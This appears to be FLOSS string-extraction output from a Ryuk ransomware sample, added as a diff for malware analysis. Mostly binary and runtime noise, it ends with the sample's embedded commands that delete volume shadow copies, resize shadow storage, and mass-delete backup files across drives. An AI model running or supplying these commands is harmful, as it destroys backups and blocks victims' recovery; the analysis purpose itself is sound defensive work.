@@ -1,0 +1,5161 @@
+
+FLARE FLOSS RESULTS (version v2.0.0-0-gdd9bea8)
++------------------------+------------------------------------------------------------------------------------+
+| file path              | ryuk.ex_                                                                           |
+| extracted strings      |                                                                                    |
+|  static strings        | 5126                                                                               |
+|  stack strings         | 0                                                                                  |
+|  tight strings         | 0                                                                                  |
+|  decoded strings       | 2                                                                                  |
++------------------------+------------------------------------------------------------------------------------+
+
+-------------------------------
+| FLOSS STATIC STRINGS (5126) |
+-------------------------------
+------------------------------
+| FLOSS ASCII STRINGS (3963) |
+------------------------------
+!This program cannot be run in DOS mode.
+5kQ^q
+Richq
+.text
+`.rdata
+@.data
+.gfids
+@.reloc
+PWh#
+YY^]
+u$WSQ
+^_[]
+SVWh^
+ufh^
+jVXf
+WSSWWh
+j Y+
+j Y+
+8csm
+h@"@
+Y__^[
+ineI
+5ntel
+5Genu
+t#=`
+=  A
+vZWh
+=  A
+vZWh
+PPPh  A
+h  A
+8_^]
+xj~W
+8csm
+_^[]
+^_[]
+j2X^]
+j2X^]
+j2X^]
+j2X^]
+URPQQhP)@
+L$,3
+UVWS
+[_^]
+SVWj
+_^[]
+j Y+
+SVWUj
+h(+@
+]_^[
+h0+@
+;t$,v-
+UQPXY]Y[
+99t	
+wOtD
+PWWS
+A98u
+>"u1
+< t1<	t-
+QQSVW
+PPPPP
+Y_^]
+hi4@
+t <"u
+j Y+
+YYhh
+t#Vh,
+j Y+
+j Y+
+j Y+
+j Y;E
+j Y+
+j _;
+j Y+
+j Y+
+5p&A
+@HP$A
+FLY;
+uIhd
+uQhd
+h4C@
+PPPPP
+PPPPP
+PPPPP
+WWWPWS
+u-PWWS
+PQhH"A
+PQhP#A
+=P$A
+_^[]
+IH;A
+SSVWh 
+xHP$A
+9wLt
+;5p&A
+5p&A
+X_^]
+f9:t!V
+f9:u
+QSVW
+YWWW
+SVWW
+WSVPP
+_^[]
+^[_]
+QQSWj0j@
+Y_[^]
+xg;5
+_^[]
+SVW3
+_^[]
+9E WW
+t4SWV
+Y_^[
+YY^]
+j,h`
+j Y+
+j@%@
+~';_
+GWVj	
+PPPPPPPP
+9E(j
+PPPPPWS
+QQQP
+PP9E u:PPVWP
+SVW3
+~0WPQ
+x7;5
+Ht$;}
+SShU
+(@t	
+<$tL
+|%=2
+QQSV
+x7;5
+_^[]
+h@"@
+Y_^[
+Y_^[
+v	N+D$
+h@"@
+WVU3
+v	N+D$
+<$Xf
+oF f
+oF f
+oF f
+oV f
+o^0f
+of@f
+onPf
+ov`f
+o~pf
+FGIu
+FGIu
+^_[3
+oF f
+oF f
+oF f
+oV f
+o^0f
+of@f
+onPf
+ov`f
+o~pf
+FGIu
+FGIu
+Main Invoked.
+Main Returned.
+EventRegister
+EventSetInformation
+EventUnregister
+EventWriteTransfer
+FlsAlloc
+FlsFree
+FlsGetValue
+FlsSetValue
+InitializeCriticalSectionEx
+__based(
+__cdecl
+__pascal
+__stdcall
+__thiscall
+__fastcall
+__vectorcall
+__clrcall
+__eabi
+__ptr64
+__restrict
+__unaligned
+restrict(
+ new
+ delete
+operator
+`vftable'
+`vbtable'
+`vcall'
+`typeof'
+`local static guard'
+`string'
+`vbase destructor'
+`vector deleting destructor'
+`default constructor closure'
+`scalar deleting destructor'
+`vector constructor iterator'
+`vector destructor iterator'
+`vector vbase constructor iterator'
+`virtual displacement map'
+`eh vector constructor iterator'
+`eh vector destructor iterator'
+`eh vector vbase constructor iterator'
+`copy constructor closure'
+`udt returning'
+`RTTI
+`local vftable'
+`local vftable constructor closure'
+ new[]
+ delete[]
+`omni callsig'
+`placement delete closure'
+`placement delete[] closure'
+`managed vector constructor iterator'
+`managed vector destructor iterator'
+`eh vector copy constructor iterator'
+`eh vector vbase copy constructor iterator'
+`dynamic initializer for '
+`dynamic atexit destructor for '
+`vector copy constructor iterator'
+`vector vbase copy constructor iterator'
+`managed vector copy constructor iterator'
+`local static thread guard'
+operator "" 
+ Type Descriptor'
+ Base Class Descriptor at (
+ Base Class Array'
+ Class Hierarchy Descriptor'
+ Complete Object Locator'
+CorExitProcess
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+March
+April
+June
+July
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+GetCurrentPackageId
+LCMapStringEx
+LocaleNameToLCID
+log10
+lzZ?
+log10
+asin
+acos
+sqrt
+	k8=
+?5Wg4p
+Nv$^
+w(@	
+BC .=
+(lX 
+#{ =
+`~R=
+}s"=
+%S#[k
+"B <1=
+\-!y
+#.X'=
+i9+=
+?tanh
+atan
+atan2
+ceil
+floor
+fabs
+modf
+ldexp
+_cabs
+_hypot
+fmod
+frexp
+_logb
+_nextafter
+sinh
+cosh
+kernel32.dll
+IsWow64Process
+ETW0
+InvokeMainViaCRT
+"Main Invoked."
+FileName
+ExitMainViaCRT
+"Main Returned."
+FileName
+Microsoft.CRTProvider
+GCTL
+.text
+.text$mn
+.idata$5
+.00cfg
+.CRT$XCA
+.CRT$XCAA
+.CRT$XCZ
+.CRT$XIA
+.CRT$XIAA
+.CRT$XIAC
+.CRT$XIC
+.CRT$XIZ
+.CRT$XPA
+.CRT$XPX
+.CRT$XPXA
+.CRT$XPZ
+.CRT$XTA
+.CRT$XTZ
+.rdata
+.rdata$sxdata
+.rdata$zETW0
+.rdata$zETW1
+.rdata$zETW2
+.rdata$zETW9
+.rdata$zzzdbg
+.rtc$IAA
+.rtc$IZZ
+.rtc$TAA
+.rtc$TZZ
+.xdata$x
+.idata$2
+.idata$3
+.idata$4
+.idata$6
+.data
+.bss
+.gfids$x
+.gfids$y
+GetCurrentProcess
+WriteFile
+GetModuleFileNameW
+CreateFileW
+GetVersionExW
+LoadLibraryA
+CloseHandle
+GetWindowsDirectoryW
+GetProcAddress
+FreeLibrary
+GetTickCount
+KERNEL32.dll
+ShellExecuteW
+SHELL32.dll
+QueryPerformanceCounter
+GetCurrentProcessId
+GetCurrentThreadId
+GetSystemTimeAsFileTime
+InitializeSListHead
+IsDebuggerPresent
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+GetStartupInfoW
+IsProcessorFeaturePresent
+GetModuleHandleW
+TerminateProcess
+GetLastError
+InitializeCriticalSectionAndSpinCount
+TlsAlloc
+TlsGetValue
+TlsSetValue
+TlsFree
+LoadLibraryExW
+RtlUnwind
+SetLastError
+EnterCriticalSection
+LeaveCriticalSection
+DeleteCriticalSection
+GetStdHandle
+GetModuleFileNameA
+MultiByteToWideChar
+WideCharToMultiByte
+ExitProcess
+GetModuleHandleExW
+GetACP
+HeapFree
+HeapAlloc
+FindClose
+FindFirstFileExA
+FindNextFileA
+IsValidCodePage
+GetOEMCP
+GetCPInfo
+GetCommandLineA
+GetCommandLineW
+GetEnvironmentStringsW
+FreeEnvironmentStringsW
+LCMapStringW
+SetStdHandle
+GetFileType
+GetStringTypeW
+GetProcessHeap
+HeapSize
+HeapReAlloc
+FlushFileBuffers
+GetConsoleCP
+GetConsoleMode
+SetFilePointerEx
+WriteConsoleW
+DecodePointer
+RaiseException
+SystemFunction036
+ADVAPI32.dll
+qj"*
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+!This program cannot be run in DOS mode.
+Rich
+.text
+`.rdata
+@.data
+.pdata
+@.gfids
+@.rsrc
+@.reloc
+\$0H
+x ATAVAWH
+D$0D
+D$(I
+\$`H
+l$hH
+t$pH
+|$xH
+@A_A^A\
+T$xA
+D$4A
+D$8A
+D$<H
+T$(D
+T$0H
+L$ SVWH
+t$ L
+0_^[
+rY1A
+rY1A
+rY1A
+\$0H
+t$8H
+|$@H
+gfff
+t$L+
+t'Ic
+\$0H
+l$8H
+t$@H
+\$DtXH
+D$@H
+L$@H
+\$0H
+WATAUAVAW
+D$0A
+L$0L
+L$ E3
+L$ E3
+fD9,Hu
+OfA;
+fA;DI
+fA;DJ
+OfA;
+GfA;
+fA;LD
+D9+t
+A_A^A]A\_
+D$HH
+D$03
+L$HH3
+D$0L
+D$8H
+D$<3
+D$(H
+D$ D
+L$HH3
+L$HH3
+L$HH3
+|$ UATAUAVAWH
+L$X3
+l$PH
+l$@E
+D$`8
+T$`H
+T$`I
+D$h3
+L$hL
+L$PH
+D$@E3
+D$ M
+L$PL
+D$@M
+D$LH
+D$0L
+L$HH
+D$DD
+l$LH
+D$(E3
+l$ D
+l$HD
+D$H3
+L$DL
+L$HH
+D$L3
+D$0H
+D$DH
+D$(H
+T$`I
+A_A^A]A\]
+D$@H
+L$@H
+|$0H
+|$0H
+\$ WH
+Hc@<3
+D$ @
+D$@H
+D$ L
+l$xH
+L$XH3
+t$ WH
+f9(t
+f9(u
+f9(u
+t1Hc
+l$0E3
+l$PH
+L$PH
+l$ H
+f9)t
+f9)u
+f9(u
+\$XH
+l$`H
+t$hH
+D$  
+D$ (
+D$  
+D$ (
+D$(H
+uRfD95
+fD90u
+fD90u
+NfD95U
+fD90u
+fD90u
+5,S8
+4OfD95
+fD97u
+fD95
+fD90u
+fD90u
+%"+8
+T$0D
+t$03
+T$03
+T$0H
+S.ff
+\$HA
+\$PL
+\$XL
+\$@@
+gfff
+L|@H
+\|BE
+DD>fB
+DD@f
+T$@M
+DDH.
+gfff
+L|@H
+\|BE
+L$Bff
+DD>f
+D|@f
+fD9T$Jt
+DDH0
+L$HH
+T$@H
+\DHf
+DDH.
+gfff
+L|@H
+\|BE
+L$Bff
+DD>f
+D|@f
+fD9T$Jt
+DDH0
+L$HH
+T$@H
+\DHf
+DDH.
+gfff
+L|@H
+\|BE
+L$Bff
+DD>f
+D|@f
+f9t$Jt
+DDH0
+L$HH
+T$@H
+\DH3
+L$pM
+L$pH
+T$HH
+\DpH
+D$pI
+L$83
+fD9u
+fD90u
+@USVWAVH
+D$xL
+|$0E3
+|$XL
+|$pH
+T$XH
+T$pH
+L$XL
+D$pA
+L9l$Xu
+|$hI
+|$hA
+L$XH
+T$XE3
+|$ H
+t$pI
+|$ H
+D$L@B
+D$H@B
+D$HE3
+|$PE3
+D$HL
+L$PH
+|$0H
+D$(E3
+|$ 3
+D$L@B
+D$LE3
+D$0E
+D$H3
+D$(H
+D$HL
+L$PH
+|$PH
+|$p@KL
+HERMf
+L$hH
+@88u
+@88u
+@88u
+@88u
+@88u
+@88u
+@88u
+|$T@8}
+@88u
+L$TH
+|$ H
+t$xH
+D$`H
+L$@E3
+D$(I
+|$ E
+L$@E3
+D$`H
+D$(H
+D$`L
+L$TH
+|$TH
+|$p@KL
+|$ H
+A^_^[]
+@USVWH
+L$PL
+D$HH
+T$@H
+L$0H
+t1Ic
+T$`f
+D$XH
+T$`H
+~bIc
+fB9DE
+T$`H
+~LIc
+fB9DE
+~GMc
+f9DU
+~GMc
+f9DU
+~GMc
+f9DU
+~GMc
+f9DU
+f9DU
+T$`H
+~LIc
+fB9DE
+~GMc
+f9DU
+~GMc
+f9DU
+~GMc
+f9DU
+~GMc
+f9DU
+f9DU
+T$`H
+~IIc
+fB9DE
+~GMc
+f9DU
+~GMc
+f9DU
+~GMc
+f9DU
+~GMc
+f9DU
+~GMc
+f9DU
+L$PH
+D$H3
+T$@H
+~WIc
+~NMc
+~2Mc
+\$8M
+~MMc
+~BMc
+D$8I
+D$8H
+T$03
+D$HI
+T$8I
+D$PI
+|$(L
+|$ 3
+L$83
+t$0H
+|$XH
+T$`H
+_^[]
+D$ E3
+\$PH
+L$`H
+L$0L
+L$`L
+u[fA
+\uSI
+<P\t
+|$XH
+\$PH
+\$PH
+UATAUAVAWH
+D8(u
+A0	A
+D8(u
+D8(u
+D8(u
+D8(u
+ fA1
+D8(u
+ fA1
+D8(u
+D8(u
+D8(u
+D8(u
+D8(u
+D8(u
+D8(u
+D8(u
+D8(u
+D8(u
+ fA1
+D8(u
+ fA1
+D8(u
+ fA1
+D8(u
+ fA1
+D8(u
+ fA1
+eu#8M
+lu0D:
+lt	A
+du^D:
+GetI
+pNet
+Tablf
+\$PI
+A_A^A]A\]
+\$0H
+UATAUAVAWH
+uWf9u
+f90u
+f90u
+D$H\
+D$Ls
+D$Pr
+D$T\
+D$Xu
+D$\l
+D$`c
+D$dw
+D$hn
+D$lo
+D$p.
+D$ta
+t$xf9u
+f90u
+f90u
+T$HHc
+t$0Hc
+@80u
+t$@D
+Ap@8
+@80u
+L$@H
+t$ H
+f90u
+f90u
+f90u
+f90u
+t$(L
+t$ 3
+t$(L
+t$ H
+A_A^A]A\]
+D$8H
+L$6H
+D$ H
+L$8H3
+\$PH
+UAVAWH
+L$0M
+fD9}
+fD98u
+fD98u
+fD9}
+fD98u
+fD98u
+fD9}
+fD98u
+fD98u
+|$(L
+D$0L
+|$ 3
+A_A^]
+D$8H
+D$8H
+D$@H
+D$(H
+D$(H
+T$0H
+\$ WH
+T$PH
+L$XH
+T$PL
+L$0L
+L$`H
+L$(3
+\$hH
+@SVWH
+T$`H
+L$hH
+T$`L
+L$0L
+L$pH
+L$(3
+@_^[
+\$@H
+t!eH
+\$PH
+u|Hc
+uWL+
+\$ UH
+M H1E
+ H3E H3E
+\$HH
+L$0L
+L$(H
+L$ 3
+L$PH
+D$PH
+D$@H
+D$H3
+L$ D
+HcA<H
+8csm
+\$0H
+t$8H
+\$0H
+t$8H
+ntelD
+ineID
+GenuD
+cAMD
+AuthA
+entiA
+t(=`
+t!=p
+\$8H
+\$p=
+D$PH
+L$pH
+D$hH
+D$0E3
+D$(H
+\$p=
+D$PH
+L$pH
+D$hH
+D$0E3
+D$(H
+WATAUAVAWH
+Y8M+
+l$0H
+|$8;3
+L$0I
+x}~t
+D$(I
+~HI+
+ tDE3
+\$@I
+A_A^A]A\_
+WATAUAVAWH
+\$PH
+l$XH
+t$`H
+ A_A^A]A\_
+x AVH
+\$0H
+l$8H
+t$@H
+|$HH
+x AVH
+\$0H
+l$8H
+t$@H
+|$HH
+\$0H
+x AVH
+L$hL
+L$(L
+L$`H
+L$ I
+\$@H
+l$HH
+t$PH
+|$XH
+\$0H
+\$0H
+\$0H
+t$8H
+\$0H
+l$8H
+t$@H
+u9SH
+d$ L
+p AWH
+u3HcH<H
+\$0H
+t$8H
+|$@L
+t$HH
+t(eH
+L$8H
+L$8H
+\$0H
+x AVH
+M0E3
+\$0H
+l$8H
+t$@H
+|$HH
+L$ WH
+\$0H
+\$0H
+l$8H
+t$@H
+E+BHI
+E+BHI
+x AVH
+\$0H
+l$8H
+t$@H
+|$HH
+D$PH
+D$XH
+\$0H
+L$8@
+D$@H
+T$0H
+D$0L
+L$(H
+L$`H
+D$ M
+\$0H
+VWAVH
+D$@H;G
+\$H@
+l$PH
+ A^_^
+S,, <Zw
+{A*t
+{A*t
+CA< t(<#t
+<0uC
+\$0H
+l$8H
+PtdH
+AA<Fu
+<Nu'
+<htr<jtb<lt6<tt&<wt
+<<6u
+!,X< w
+t$ WAVAWH
+D$P3
+D$P-
+D$P+
+D$P I
+D<P0I
+D<PI
+s4+sP+
+D$ L
+T$PI
+\$XH
+l$`H
+t$hH
+0A_A^_
+t$8H
+AA,A$
+AA,G
+D$`H
+D$`u
+D$@H
+L$(H
+L$`L
+L$ M
+CA,G
+K0@H
+,I<%w
+CAsH
+\$hH
+\$0H
+tZI;
+9C8~
+HcG(H
+\$0H
+t$8H
+\$0H
+L$0A
+D$0E
+D$ H
+;{Pu
+L$@H3
+\$hH
+t$pH
+WAVAWH
+|$`Ic
+?*u8H
+\$@H
+l$HH
+t$PH
+ A_A^_
+t-H+
+8L$Pt
+@8|$Pt
+\$0H
+D$ I
+D$ I
+\$0H
+l$8H
+t$@H
+\$0H
+x ATAVAWH
+|$`M
+;"u1
+< t;<	t7
+\$@H
+l$HH
+t$PH
+|$XH
+ A_A^A\
+UVWAVAWH
+@8>u
+D$ E3
+H9:t
+H98u
+\$`H
+0A_A^_^]
+\$0H
+WAVAWH
+A86taH
+A84.u
+>=t5
+\$PH
+t$`H
+l$XH
+0A_A^_
+t$ E3
+\$0H
+t&<"u
+\$0H
+x AVH
+\$0H
+l$8H
+t$@H
+|$HH
+\$0H
+t$8H
+H9=,	
+\$0H
+L$ WH
+\$0H
+L$ WATAUAVAWH
+H3:A
+|$0H
+\$ H
+|$(L
+\$8A
+\$ H;
+?H33H
+L$(I
+L$0L
+D$8H
+\$pH
+t$xH
+@A_A^A]A\_
+x ATAVAWH
+\$@H
+l$HH
+t$PH
+|$XH
+ A_A^A\
+D$PI
+t7SH
+|$ UATAUAVAWH
+<	w	@
+	w!@
+t-A;
+@88t
+\$@I
+A_A^A]A\]
+WATAUAVAWH
+\$PH
+l$XH
+t$`H
+ A_A^A]A\_
+\$0H
+\$0H
+\$0H
+\$0H
+t$8H
+\$0H
+l$8H
+t$@H
+x AVH
+L$8H
+L$(I
+\$`H
+l$hH
+t$pH
+|$xH
+\$0H
+t$8H
+\$8H
+UWAVH
+L$pA
+D$pH
+D$HH
+T$@I
+L$`H
+T$@L
+L$0M
+L$XH
+L$(H
+L$ 3
+t$pH
+A^_]
+x AVH
+\$@H
+l$HH
+t$PH
+|$XH
+0A^H
+D$`D
+D$ H
+\$0H
+\$$;
+tnHc
+D$ H
+D$ H
+\$@H
+\$0H
+t$8H
+WAVAWH
+|$(I;
+\$hH
+\$0H
+T$ A;
+T$ H
+DD$$H
+\$`H
+t$pH
+@A_A^_
+x AVH
+fD9t$b
+D$hH
+K8@H
+\$0H
+t$8H
+|$@H
+\$0H
+t$ UH
+D$8H
+L$ H
+x AVH
+D82u&H
+\$`H
+l$hH
+t$pH
+|$xH
+D$8L9
+L$8D
+~/A;
+D$(H
+r:D8v
+D$(H
+D$8H
+D8t$Ht
+L$ WH
+D$HH
+\$`I
+L$xH
+L$8L
+|$(H
+l$ H
+l$ H
+L$ WH
+\$0H
+L$ WH
+\$0H
+L$ WH
+\$0H
+L$ WH
+\$0H
+\$0H
+\$0H
+\$0H
+t$8H
+x ATAVAWH
+d$@L
+D$8H
+\$(H
+D$XH
+E8&I
+d|.H
+gfffffffH
+D8d$ht
+A_A^A\
+|$@-D
+D$8H
+\$`H
+l$hH
+t$pH
+x AWH
+\$`H
+l$hH
+t$pH
+|$xH
+D$8H
+80tWD
+gfffA
+x AVH
+T$xH
+D$(H
+\$P3
+l$XH
+t$`H
+|$hH
+t$DL
+L$@D
+|$@-H
+L$@D
+D$(H
+D$8H
+\$`H
+l$hH
+t$pH
+M?H3
+WATAUAVAWH
+D$@L
+|$8I
+D$(L
+D$PI
+D$PM
+D$XL
+D$TL
+L$P3
+|$P-
+L$PH
+D$(D
+D$@L
+|$8I
+D$(L
+D$@L
+|$8I
+D$(L
+\$`I
+A_A^A]A\_
+\$0H
+t4SH
+UVWATAUAVAWH
+:H99
+EP*?@
+}PH+
+UXI;
+C8<(u
+EXM;
+`A_A^A]A\_^]
+|$ E3
+x ATAVAWH
+\$PH
+l$XH
+t$`H
+|$hH
+0A_A^A\
+uML+
+\$ UVWAVAWH
+,/<-w
+L$0H
+|$(L
+D$0H
+|$ 3
+A_A^_^]
+I+.H
+|$\.u
+t"<.u
+@8|$^t
+L$\M
+T$0H
+H+1H
+\$0H
+l$8H
+t$@H
+L$ WH
+\$0H
+\$0H
+t$8H
+\$0H
+l$8H
+t$@H
+D$VH
+D$p 
+D$8H
+\$0H
+D$8H
+\$0H
+EpL+
+UVWH
+\$`H
+@_^]
+\$0H;
+L$0H;
+\$8H
+l$ VWATAVAWH
+D$8H
+D9|$ 
+L$&@8t$&t0@8q
+@81u
+A81t@@8r
+@82u
+L$8H3
+\$@I
+A_A^A\_^
+D$(H
+\$PH
+t$XH
+x AVH
+fD90t
+fD94Fu
+fD96u
+t$8H+
+t$0H
+t$(3
+t$ 3
+t$8D
+t$0L
+l$(3
+\$PH
+t$`H
+l$XH
+|$hH
+\$0H
+t$@H
+l$8H
+\$0H
+t$8H
+\$@H
+t$HH
+|$PH
+\$0H
+t$8H
+|$@H
+s*Hc
+K H;
+K(H;
+K0H;
+K8H;
+K@H;
+KHH;
+KhH;
+KpH;
+KxH;
+tfSH
+KXH;
+K`H;
+\$0H
+t$8H
+\$0H
+l$8H
+T$0H
+L$0H
+D$0H
+@UATAUAVAWH
+l$0H
+w:H;
+\$0H
+t$(M
+M H3
+e0A_A^A]A\]
+\$0H
+l$8H
+t$@H
+t0SH
+\$0H
+\$0H
+\$0H
+l$8H
+t$@H
+\$0H
+l$8H
+t$@H
+t$8H
+L$ WH
+\$0H
+D$8I
+D$@I
+SVWATAUAWH
+D$0I
+D$(H;
+HA_A]A\_^[
+t$ UH
+L$(H
+x AV3
+t$ H
+|$(A^
+\$0H
+\$8H
+L$ WH
+\$0H
+T$XL
+L$PH
+T$XH
+D$ L
+D$ H
+UVWATAUAVAWH
+D0(H
+L2=A
+Ht)I;
+D$ H
+T$ D
+D1>K
+A_A^A]A\_^]
+VWAV
+|$@H;
+D$@+
+L$0D
+T$@I
+A^_^
+VWAV
+\$@H;
+D$@H+
+L$0H
+A^_^
+VWATAVAW
+D$PI;
+L$PH
+D$PH+
+D$(U
+L$ D
+L$@D
+t$@;
+A_A^A\_^
+WATAUAVAWH
+\$XH
+t$`H
+ A_A^A]A\_
+\$ UVWATAUAVAWH
+D18 t
+B8|09
+L1(L
+H!D$ E
+D08@t	
+`A_A^A]A\_^]
+@UATAUAVAWH
+l$PH
+Hc]`M
+w7H;
+t$PH
+d$(D
+D$(I
+w>H;
+\$PH
+|$(I
+H!T$0D
+uf!T$(H!T$ 
+A_A^A]A\]
+D$(H
+D$@L
+D$8H
+D$0H
+\$pI
+D$DH
+D$DD
+t$@L
+D$DD
+\$0H
+D$8A;
+L$8E
+D$(I
+D$(3
+\$0E
+@USVWATAUAVAWH
+L$8M
+L$`L
+L$PM
+D$`E3
+\$8H
+D$XH
+T$XL
+t$LI
+l$8E
+rGD;
+d$0A
+rMD;
+l$8t
+D$HD
+l$DA
+T$8D
+u!E;
+stgE;
+T$8A
+d$@D
+D$HE3
+D$8D
+l$HA
+T$XD
+u!E;
+stfE;
+T$XA
+d$@D
+L$DE3
+|$0s-
+|$0H
+t$PH
+|$0H
+t$PH
+D8l$ht
+A_A^A]A\_^[]
+l$ E3
+l$ E3
+l$ E3
+l$ E3
+l$ E3
+\$0H
+t$8H
+L$8Lc
+L$83
+T$8D
+D$8;
+A8 t
+T$0A
+\$@H
+t$HH
+\$0H
+t$8H
+s&Hc
+l$ WAVAWH
+\$@M
+t$HI
+d$PH
+t&H+
+d$PH
+t$HH
+\$@H
+l$XH
+ A_A^_
+@UATAVH
+s#H+
+|&L;
+A^A\]
+\$0H
+D$@3
+L$@H3
+\$PH
+\$0H
+L$ WH
+\$0H
+T$XL
+L$PH
+T$XH
+D$ L
+D$ H
+\$0H
+WATAUAVAWH
+\$XH
+t$`H
+ A_A^A]A\_
+D$HH
+D$HH
+\$0H
+t$8H
+L$HA
+D$@H
+D$09
+D$49C
+D$8H
+@CH;
+ot$ H
+ffffff
+ot$ H
+ot$ H
+ot$ H
+ot$ H
+ot$ H
+fffffff
+ot$ H
+t'H;
+ot$ H
+|$ ATAVAWH
+t$A;
+\$@@8=!
+\$HH
+t$PH
+|$XH
+ A_A^A\
+D$@H
+t$83
+USVWAVH
+D$@H
+D$PH
+D$HH
+D$(H
+T$@H
+L$`H
+D$@M
+D$HH
+A^_^[]
+T$ H
+D$ D
+D$8A
+D$("
+L$xL
+(t$PH
+D$xH
+D$(H
+D$pH
+t>H=
+t&H=
+!P H
+!P`H
+A A#
+B`A#
+\$8H
+t$@H
+|$HH
+t$ WH
+\$@H
+t$HH
+LcA<E3
+t"H+
+\$0H
+HcH<H
+ vJH+
+Main Invoked.
+Main Returned.
+EventRegister
+EventSetInformation
+EventUnregister
+EventWriteTransfer
+FlsAlloc
+FlsFree
+FlsGetValue
+FlsSetValue
+InitializeCriticalSectionEx
+__based(
+__cdecl
+__pascal
+__stdcall
+__thiscall
+__fastcall
+__vectorcall
+__clrcall
+__eabi
+__ptr64
+__restrict
+__unaligned
+restrict(
+ new
+ delete
+operator
+`vftable'
+`vbtable'
+`vcall'
+`typeof'
+`local static guard'
+`string'
+`vbase destructor'
+`vector deleting destructor'
+`default constructor closure'
+`scalar deleting destructor'
+`vector constructor iterator'
+`vector destructor iterator'
+`vector vbase constructor iterator'
+`virtual displacement map'
+`eh vector constructor iterator'
+`eh vector destructor iterator'
+`eh vector vbase constructor iterator'
+`copy constructor closure'
+`udt returning'
+`RTTI
+`local vftable'
+`local vftable constructor closure'
+ new[]
+ delete[]
+`omni callsig'
+`placement delete closure'
+`placement delete[] closure'
+`managed vector constructor iterator'
+`managed vector destructor iterator'
+`eh vector copy constructor iterator'
+`eh vector vbase copy constructor iterator'
+`dynamic initializer for '
+`dynamic atexit destructor for '
+`vector copy constructor iterator'
+`vector vbase copy constructor iterator'
+`managed vector copy constructor iterator'
+`local static thread guard'
+operator "" 
+ Type Descriptor'
+ Base Class Descriptor at (
+ Base Class Array'
+ Class Hierarchy Descriptor'
+ Complete Object Locator'
+CorExitProcess
+( 8PX
+700WP
+`h````
+xpxxxx
+(null)
+GetCurrentPackageId
+LCMapStringEx
+LocaleNameToLCID
+NAN(SNAN)
+nan(snan)
+NAN(IND)
+nan(ind)
+e+000
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+March
+April
+June
+July
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+d8L2
+[aOni*{
+@2&@
+"RP(
+eLK(w
+FEMh
+h0'D
+owM&
+~ $s%r
+@b;zO]
+$qE}
+;*xh
+["93
+iu+-,
+\lo}
+obwQ4
+&Sgw
+R	E]
+?nz(
+=87M
+v2!L.2
+	cQr
+X/4B
+k=yI
+^<V7w
+W&|.
+1#INF
+1#QNAN
+1#SNAN
+1#IND
+UUUUUU
+UUUUUU
+TUUUU
+#Ib?
+=imb;D
+=W>6
+:		r
+>[^j
+>Kb|
++>De
+1<.	/>:
+11Y@
+/>58d%
+MJ$>
+>cQ6
+!>6'Y
+>jtm}S
+>77:
+)>6{1n
+r	Vr.>T
++f)>0'
+Lj[;>
+3>fvw
+;H9>&X
+*StO9>T
+.>Tu
+.(!>
+n03>Pu
+/>	V
+S9>H
+x.&>
+K~Je#>!
+-/!>
+(>aI
+=cQ6
++M<7>
+*>f[
+o ->
+l(>>
+c(>\,
+ET5>
+;>9l
+mG4>
+bp(=>?g
+36,>
+37>k
+~X3>
+6>J`
+?>!T
+BC?>6t9^	c:>
+8'>0
+'._M
+=4<,
+BF>^G
+K&>.yC
+ 'L>[
+.xJ>Hf
+y\PD>!
+|b=})>
+c [1>H'
+dL?>
+uzKs@>
+3>N;kU
+	kE>fvw
+eF>t
+L>ev
+A>pP&
+V6E>`"(5
+,=>B
+">}t
+0iN>/
++h->|
+@>%>b
+?qBJ
+l@6 
+?-hk
+OZQ%
+-)4d
+?:kP<
+?UUUUUU
+?f`Y4
+?QY^&
+?U)#
+?ysB
+?$G4
+?30]
+?7zQ6$
+log10
+LookupPrivilegeValue error: %u
+AdjustTokenPrivileges error: %u
+The token does not have the specified privilege. 
+Iphlpapi.dll
+GetLastError
+GetSystemDefaultLangID
+WaitForMultipleObjects
+GetFileSizeEx
+MoveFileExW
+SetFilePointerEx
+CreateThread
+vssadmin Delete Shadows /all /quiet
+vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB
+vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded
+vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB
+vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded
+vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB
+vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded
+vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB
+vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded
+vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB
+vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded
+vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB
+vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded
+vssadmin Delete Shadows /all /quiet
+del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
+del /s /f /q d:\*.VHD d:\*.bac d:\*.bak d:\*.wbcat d:\*.bkf d:\Backup*.* d:\backup*.* d:\*.set d:\*.win d:\*.dsk
+del /s /f /q e:\*.VHD e:\*.bac e:\*.bak e:\*.wbcat e:\*.bkf e:\Backup*.* e:\backup*.* e:\*.set e:\*.win e:\*.dsk
+del /s /f /q f:\*.VHD f:\*.bac f:\*.bak f:\*.wbcat f:\*.bkf f:\Backup*.* f:\backup*.* f:\*.set f:\*.win f:\*.dsk
